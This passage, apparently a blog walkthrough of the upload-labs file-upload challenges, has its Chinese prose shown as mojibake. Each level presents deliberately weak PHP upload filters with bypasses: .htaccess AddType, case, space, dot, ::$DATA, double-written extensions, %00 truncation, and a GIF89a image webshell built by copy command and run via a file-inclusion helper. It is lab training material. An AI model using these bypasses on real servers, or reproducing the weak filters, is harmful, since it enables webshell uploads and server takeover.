.htaccessçš„ç”¨é€”èŒƒå›´ä¸»è¦é’ˆå¯¹å½“å‰ç›®å½•ã€‚ æˆ‘ä»¬å¯ä»¥ä¸Šä¼ ä¸€ä¸ª.htaccessæ–‡ä»¶ï¼Œä½¿å¾—Apacheå¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ï¼Œä½†è¦æ³¨æ„å¹¶ä¸æ˜¯ä»»ä½•æ—¶å€™éƒ½å¯ä»¥ä¸Šä¼ ä¸€ä¸ªæœ‰æ•ˆçš„.htaccessæ–‡ä»¶ï¼Œåœ¨è®©.htaccessç”Ÿæ•ˆä¹‹å‰è¿˜éœ€è¦å¯¹httpd.confæ–‡ä»¶è¿›è¡Œé…ç½®ï¼š ä¿®æ”¹httpd.confï¼Œå¯ç”¨AllowOverrideï¼š 1AllowOverride All ä¿®æ”¹httpd.confï¼Œå¢åŠ å¦‚ä¸‹è¯­å¥ï¼š 1LoadModule rewrite_module modules&#x2F;mod_rewrite.so .htaccessæ–‡ä»¶ï¼š 1AddType application&#x2F;x-httpd-php .jpg å†ä¸Šä¼ .htaccessæ–‡ä»¶ï¼Œè¿™æ ·Apacheå°±å¯ä»¥å°†jpgæ–‡ä»¶è§£ææˆphpæ–‡ä»¶ã€‚ Pass-05 åˆ©ç”¨åç¼€åå¤§å°å†™ç»•è¿‡ ä»£ç  1234567891011121314151617181920212223242526$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125; ç»•è¿‡æ–¹å¼ è§£æé¡ºåº åˆ†æä»£ç ï¼Œæˆ‘ä»¬å¯ä»¥çœ‹åˆ°è¿™å¥$file_ext = strrchr($file_name, '.');ä¸­çš„strrchr()å‡½æ•°æ˜¯æœ‰ç‚¹é—®é¢˜çš„ã€‚è¿™ä¸ªå‡½æ•°çš„æ„æ€æ˜¯â€œå‡½æ•°æŸ¥æ‰¾å­—ç¬¦ä¸²åœ¨å¦ä¸€ä¸ªå­—ç¬¦ä¸²ä¸­æœ€åä¸€æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¹¶è¿”å›ä»è¯¥ä½ç½®åˆ°å­—ç¬¦ä¸²ç»“å°¾çš„æ‰€æœ‰å­—ç¬¦â€ã€‚æ‰€ä»¥å’ŒPass-03ç›¸ä¼¼ï¼šå½“ç¢°åˆ°ä¸è®¤è¯†çš„æ‰©å±•åæ—¶ï¼Œå°†ä¼šä»åå‘å‰è§£æï¼Œç›´åˆ°ç¢°åˆ°è®¤è¯†çš„ æ‰©å±•åï¼Œå¦‚æœéƒ½ä¸è®¤è¯†ï¼Œåˆ™ä¼šæš´éœ²å…¶æºç ã€‚ å¤§å°å†™ç»•è¿‡ å¯ä»¥ç›´æ¥å°†æ–‡ä»¶æ”¹ä¸º.PHPåç¼€ï¼ŒApacheç…§æ ·æˆåŠŸè§£æã€‚ Pass-06 åˆ©ç”¨ç©ºæ ¼ç»•è¿‡ ä»£ç  123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = $_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]; $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file,$img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ä¸å…è®¸ä¸Šä¼ &#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ ç›¸æ¯”å‰å‡ é¢˜ï¼Œå¤§å°å†™ç»•è¿‡å’Œä¸Šä¼ .htaccessæ–‡ä»¶å·²ç»è¡Œä¸é€šäº†ï¼Œä½†æ˜¯æ²¡æœ‰å»é™¤æ–‡ä»¶åé¦–å°¾çš„ç©ºæ ¼ã€‚æ‰€ä»¥æ­¤å¤„å¯ä»¥åˆ©ç”¨windowsç³»ç»Ÿçš„å‘½åè§„åˆ™è¿›è¡Œç»•è¿‡ã€‚ Winä¸‹xx.jpg[ç©ºæ ¼] æˆ–xx.jpg.è¿™ä¸¤ç±»æ–‡ä»¶éƒ½æ˜¯ä¸å…è®¸å­˜åœ¨çš„ï¼Œè‹¥è¿™æ ·å‘½åï¼Œwindowsä¼šé»˜è®¤é™¤å»ç©ºæ ¼æˆ–ç‚¹ã€‚ åœ¨æ­¤å¤„ä»£ç è¿‡æ»¤äº†.å’Œ::$DATAï¼Œä½†æ˜¯æ²¡æœ‰å»æ‰æœ«å°¾çš„ç©ºæ ¼ï¼Œå› æ­¤ä¸Šä¼ ä¸€ä¸ª.php[ç©ºæ ¼]æ–‡ä»¶å³å¯ã€‚ ç©ºæ ¼ç»•è¿‡ ä¿®æ”¹æ–‡ä»¶åç¼€ä¸º1.php .è¿™ç§å½¢å¼ï¼Œä»ä»£ç æ‰§è¡Œæµç¨‹åˆ†ææ¥çœ‹ï¼Œä¼šå…ˆå»é™¤æ–‡ä»¶åæœ«å°¾çš„.,å»é™¤ä¹‹åçš„æ–‡ä»¶åç¼€æ˜¯ .php[ç©ºæ ¼]ï¼Œåˆ©ç”¨.php[ç©ºæ ¼]ç»•è¿‡é»‘åå•ï¼Œç„¶ååˆ©ç”¨windowsçš„æ–‡ä»¶å‘½åè§„åˆ™é»˜è®¤é™¤å»ç©ºæ ¼å’Œè¾¾åˆ°ä¸Šä¼ .phpçš„ç›®çš„ã€‚ Pass-07 åˆ©ç”¨.ç»•è¿‡ ä»£ç  123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ ç‚¹ç»•è¿‡ ä»ä»£ç ä¸Šçœ‹ï¼Œå¯ä»¥å‘ç°ç›¸æ¯”äºPass-06ä»£ç ï¼ŒåŠ ä¸Šäº†é¦–å°¾å»ç©ºï¼Œä½†æ˜¯å´å°‘äº†å°¾éƒ¨å»ç‚¹ã€‚æ•…å’Œä¸Šé¢Pass-06ä¸€æ ·ï¼Œåˆ©ç”¨windowsæ–‡ä»¶å‘½åè§„åˆ™ç»•è¿‡ã€‚ ç”¨burpå°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º.php.å³å¯ï¼Œè¯¦ç»†åŸç†ä¸Pass-06ç±»ä¼¼ã€‚ Pass-08 åˆ©ç”¨$DATA::ç»•è¿‡ï¼ˆWindowsç¯å¢ƒï¼‰ ä»£ç  123456789101112131415161718192021222324252627$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.date(&quot;YmdHis&quot;).rand(1000,9999).$file_ext; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ ::$DATAç»•è¿‡ ç›¸æ¯”ä¸Šé¢ä¸¤é“é¢˜ï¼Œå°‘äº†å»é™¤æ–‡ä»¶åçš„&quot;::$DATA&quot;å­—ç¬¦ä¸²è¿™ä¸€æ­¥ï¼Œè¿™é‡Œè¿˜æ˜¯åˆ©ç”¨windowsçš„ä¸€ä¸ªç‰¹æ€§ã€‚ åœ¨php+windowsçš„æƒ…å†µä¸‹ï¼šå¦‚æœæ–‡ä»¶å+&quot;::$DATA&quot;ä¼šæŠŠ::$DATAä¹‹åçš„æ•°æ®å½“æˆæ–‡ä»¶æµå¤„ç†,ä¸ä¼šæ£€æµ‹åç¼€å.ä¸”ä¿æŒ&quot;::$DATA&quot;ä¹‹å‰çš„æ–‡ä»¶åã€‚ ç”¨Burpå°†ä¸Šä¼ æ–‡ä»¶åç¼€æ”¹ä¸º:xx.php::$DATAå³å¯ã€‚ Pass-09 åˆ©ç”¨.+ç©ºæ ¼+.ç»•è¿‡ ä»£ç  12345678910111213141516171819202122232425262728$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;.php&quot;,&quot;.php5&quot;,&quot;.php4&quot;,&quot;.php3&quot;,&quot;.php2&quot;,&quot;.html&quot;,&quot;.htm&quot;,&quot;.phtml&quot;,&quot;.pht&quot;,&quot;.pHp&quot;,&quot;.pHp5&quot;,&quot;.pHp4&quot;,&quot;.pHp3&quot;,&quot;.pHp2&quot;,&quot;.Html&quot;,&quot;.Htm&quot;,&quot;.pHtml&quot;,&quot;.jsp&quot;,&quot;.jspa&quot;,&quot;.jspx&quot;,&quot;.jsw&quot;,&quot;.jsv&quot;,&quot;.jspf&quot;,&quot;.jtml&quot;,&quot;.jSp&quot;,&quot;.jSpx&quot;,&quot;.jSpa&quot;,&quot;.jSw&quot;,&quot;.jSv&quot;,&quot;.jSpf&quot;,&quot;.jHtml&quot;,&quot;.asp&quot;,&quot;.aspx&quot;,&quot;.asa&quot;,&quot;.asax&quot;,&quot;.ascx&quot;,&quot;.ashx&quot;,&quot;.asmx&quot;,&quot;.cer&quot;,&quot;.aSp&quot;,&quot;.aSpx&quot;,&quot;.aSa&quot;,&quot;.aSax&quot;,&quot;.aScx&quot;,&quot;.aShx&quot;,&quot;.aSmx&quot;,&quot;.cEr&quot;,&quot;.sWf&quot;,&quot;.swf&quot;,&quot;.htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = deldot($file_name);//åˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ $file_ext = strrchr($file_name, &#x27;.&#x27;); $file_ext = strtolower($file_ext); //è½¬æ¢ä¸ºå°å†™ $file_ext = str_ireplace(&#x27;::$DATA&#x27;, &#x27;&#x27;, $file_ext);//å»é™¤å­—ç¬¦ä¸²::$DATA $file_ext = trim($file_ext); //é¦–å°¾å»ç©º if (!in_array($file_ext, $deny_ext)) &#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = &#x27;æ­¤æ–‡ä»¶ç±»å‹ä¸å…è®¸ä¸Šä¼ ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ ç‚¹+ç©ºæ ¼+ç‚¹ç»•è¿‡ å®ƒå»é™¤äº†æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå»é™¤äº†æ–‡ä»¶åå°¾ç©ºæ ¼ï¼Œè¿˜å»é™¤äº†::$DATAï¼Œä½†æ˜¯ä»â€œåŒå†™â€çš„æ€æƒ³å‡ºå‘ï¼Œä»£ç çš„é€»è¾‘æ˜¯å…ˆåˆ é™¤æ–‡ä»¶åæœ«å°¾çš„ç‚¹ï¼Œå†å»é™¤å­—ç¬¦ä¸²::$DATAï¼Œæœ€åé¦–å°¾å»ç©ºï¼Œæ‰€ä»¥æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ç‚¹+ç©ºæ ¼+ç‚¹çš„æ–¹å¼ç»•è¿‡ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œç”¨Burpå°†æ–‡ä»¶åæ”¹ä¸ºxx.php. .ã€‚ ä¹Ÿå°±æ˜¯è¯´ï¼Œå¦‚æœä»ç¬¬ä¸‰å…³åˆ°ç¬¬ä¹å…³ï¼Œå¦‚æœç›®æ ‡æœåŠ¡å™¨æ˜¯windowsç³»ç»Ÿçš„è¯ï¼Œå‡å¯ç”¨ç‚¹ç©ºæ ¼ç‚¹ç»•è¿‡ã€‚ Pass-10 åˆ©ç”¨åŒå†™ç»•è¿‡ ä»£ç  1234567891011121314151617181920$is_upload = false;$msg = null;if (isset($_POST[&#x27;submit&#x27;])) &#123; if (file_exists(UPLOAD_PATH)) &#123; $deny_ext = array(&quot;php&quot;,&quot;php5&quot;,&quot;php4&quot;,&quot;php3&quot;,&quot;php2&quot;,&quot;html&quot;,&quot;htm&quot;,&quot;phtml&quot;,&quot;pht&quot;,&quot;jsp&quot;,&quot;jspa&quot;,&quot;jspx&quot;,&quot;jsw&quot;,&quot;jsv&quot;,&quot;jspf&quot;,&quot;jtml&quot;,&quot;asp&quot;,&quot;aspx&quot;,&quot;asa&quot;,&quot;asax&quot;,&quot;ascx&quot;,&quot;ashx&quot;,&quot;asmx&quot;,&quot;cer&quot;,&quot;swf&quot;,&quot;htaccess&quot;); $file_name = trim($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;]); $file_name = str_ireplace($deny_ext,&quot;&quot;, $file_name); $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = UPLOAD_PATH.&#x27;/&#x27;.$file_name; if (move_uploaded_file($temp_file, $img_path)) &#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else &#123; $msg = UPLOAD_PATH . &#x27;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#x27;; &#125;&#125; ç»•è¿‡æ–¹å¼ åŒå†™ç»•è¿‡ å…ˆåˆ†æä¸‹ä»£ç ï¼Œå¯ä»¥çœ‹åˆ°é—®é¢˜å‡ºç°åœ¨ç¬¬8è¡Œçš„str_ireplace()å‡½æ•°ï¼Œæ­¤å‡½æ•°åœ¨æ­¤çš„ä½œç”¨æ˜¯å¯¹$file_nameå˜é‡ä¸­å«æœ‰$deny_extå†…å®¹çš„éƒ¨åˆ†æ›¿æ¢ä¸ºç©ºï¼Œä½†æ˜¯æ­¤æ“ä½œåªæ‰§è¡Œä¸€æ¬¡ã€‚â€œåªæ‰§è¡Œä¸€æ¬¡â€å°±æ˜¯é—®é¢˜æ‰€åœ¨ï¼Œå¦‚æœæˆ‘ä»¬ä¸Šä¼ ç±»ä¼¼test.pphphpè¿™æ ·çš„æ–‡ä»¶ï¼Œä¸Šä¼ åæ–‡ä»¶ä¼šè‡ªåŠ¨è¢«ä¿®æ”¹ä¸ºtest.phpè¿›è€ŒæˆåŠŸä¸Šä¼ shellã€‚ Pass-11 åˆ©ç”¨%00æˆªæ–­ç»•è¿‡ ä»£ç  12345678910111213141516171819$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $ext_arr = array(&#x27;jpg&#x27;,&#x27;png&#x27;,&#x27;gif&#x27;); $file_ext = substr($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],strrpos($_FILES[&#x27;upload_file&#x27;][&#x27;name&#x27;],&quot;.&quot;)+1); if(in_array($file_ext,$ext_arr))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $img_path = $_GET[&#x27;save_path&#x27;].&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_ext; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else &#123; $msg = &#x27;ä¸Šä¼ å‡ºé”™ï¼&#x27;; &#125; &#125; else&#123; $msg = &quot;åªå…è®¸ä¸Šä¼ .jpg|.png|.gifç±»å‹æ–‡ä»¶ï¼&quot;; &#125;&#125; ç»•è¿‡æ–¹å¼ %00ç»•è¿‡ åˆ†æä»£ç å‘ç°æœ€ç»ˆè¿”å›çš„å›¾ç‰‡é“¾æ¥æ˜¯â€œå­˜å‚¨è·¯å¾„å+é‡å‘½ååçš„æ–‡ä»¶åâ€ï¼Œçœ‹åˆ°è¿™ä¸ªæˆ‘ä»¬å°±å¯ä»¥è”æƒ³åˆ°ä½¿ç”¨%00æˆªæ–­è·¯å¾„ã€‚ æˆªæ–­æ¡ä»¶ï¼š 1ã€phpç‰ˆæœ¬å°äº5.3.4 2ã€php.iniçš„magic_quotes_gpcä¸ºOFFçŠ¶æ€ Pass-12 åˆ©ç”¨0x00æˆªæ–­ç»•è¿‡ è¿™é‡Œä»£ç ä¸ä¸Šé¢Pass-11ä»£ç ç±»ä¼¼ï¼Œä¸è¿‡æ˜¯save_pathå‚æ•°ç”±GETä¼ å…¥å˜ä¸ºPOSTä¼ å…¥ï¼Œåˆ©ç”¨åŸç†ä¹Ÿæ˜¯00æˆªæ–­ã€‚æ•…è¿™é‡Œä¸å†å™è¿°. Pass-13 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡æ–‡ä»¶å¤´æ£€æµ‹ ä»£ç  123456789101112131415161718192021222324252627282930313233343536373839404142function getReailFileType($filename)&#123; $file = fopen($filename, &quot;rb&quot;); $bin = fread($file, 2); //åªè¯»2å­—èŠ‚ fclose($file); $strInfo = @unpack(&quot;C2chars&quot;, $bin); $typeCode = intval($strInfo[&#x27;chars1&#x27;].$strInfo[&#x27;chars2&#x27;]); $fileType = &#x27;&#x27;; switch($typeCode)&#123; case 255216: $fileType = &#x27;jpg&#x27;; break; case 13780: $fileType = &#x27;png&#x27;; break; case 7173: $fileType = &#x27;gif&#x27;; break; default: $fileType = &#x27;unknown&#x27;; &#125; return $fileType;&#125;$is_upload = false;$msg = null;if(isset($_POST[&#x27;submit&#x27;]))&#123; $temp_file = $_FILES[&#x27;upload_file&#x27;][&#x27;tmp_name&#x27;]; $file_type = getReailFileType($temp_file); if($file_type == &#x27;unknown&#x27;)&#123; $msg = &quot;æ–‡ä»¶æœªçŸ¥ï¼Œä¸Šä¼ å¤±è´¥ï¼&quot;; &#125;else&#123; $img_path = $UPLOAD_ADDR.&quot;/&quot;.rand(10, 99).date(&quot;YmdHis&quot;).&quot;.&quot;.$file_type; if(move_uploaded_file($temp_file,$img_path))&#123; $is_upload = true; &#125; else&#123; $msg = &quot;ä¸Šä¼ å¤±è´¥&quot;; &#125; &#125;&#125; ç»•è¿‡æ–¹å¼ GIF89a åˆ†æä¸‹ä»£ç ï¼Œå‘ç°æ­¤å¤„å°±æ˜¯å¯¹æ–‡ä»¶å¤´è¿›è¡Œäº†è§£æï¼Œæ­¤æ—¶åªéœ€è¦ä¸Šä¼ å›¾ç‰‡é©¬æˆ–è€…åœ¨test.phpæ–‡ä»¶çš„å¼€å¤´åŠ ä¸ŠGIF89aå³å¯ã€‚ ä¸ºäº†æ£€æµ‹å›¾ç‰‡é©¬æ˜¯å¦èƒ½æ­£å¸¸åˆ©ç”¨ï¼Œè¿™é‡Œåœ¨uploadç›®å½•ä¸­æ”¾ç½®ä¸ªæ–‡ä»¶åŒ…å«æ–‡ä»¶ï¼ŒfileInclude.phpï¼š 12&lt;?php @include($_GET[&#x27;file&#x27;]);?&gt; å†ä½¿ç”¨æ–‡ä»¶åŒ…å«æ¼æ´æ‰§è¡Œä¸Šä¼ çš„shellï¼š Windowså‘½ä»¤ åœ¨Windowsä¸‹ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åˆ¶ä½œå›¾ç‰‡ä¸€å¥è¯æœ¨é©¬ï¼š 12copy normal.jpg &#x2F;b + shell.php &#x2F;a webshell.jpg ç”¨WinHexæ‰“å¼€ç”Ÿæˆçš„å›¾ç‰‡é©¬å°±å¯ä»¥çœ‹åˆ°æ’å…¥çš„PHPä»£ç äº†ï¼š æ‰‹å·¥æ·»åŠ æ–‡ä»¶å¤´ é’ˆå¯¹æ–‡ä»¶å¤´çš„æ£€æµ‹ï¼Œæˆ‘ä»¬å¯ä»¥æ‰‹å·¥æ·»åŠ å„ç§æ ¼å¼æ–‡ä»¶çš„æ–‡ä»¶å¤´æ¥ç»•è¿‡ã€‚ æ¯”å¦‚å›¾ç‰‡ç±»å‹çš„æ–‡ä»¶å¹»æ•°å¦‚ä¸‹ï¼š JPGæ–‡ä»¶ï¼š GIFæ–‡ä»¶ï¼š æ‰€ä»¥æˆ‘ä»¬å°±å¯ä»¥ç›´æ¥åœ¨Burpä¸­æ‹¦æˆªæŠ¥æ–‡æ‰‹å·¥åœ¨Hexæ ä¸­åœ¨PHPæœ¨é©¬ä»£ç å‰æ·»åŠ ä¸ŠJPGçš„æ–‡ä»¶å¤´ï¼š Pass-14 åˆ©ç”¨å›¾ç‰‡é©¬ç»•è¿‡getimagesize() ä»£ç  1234567891011121314151617181920212223242526272829303132function 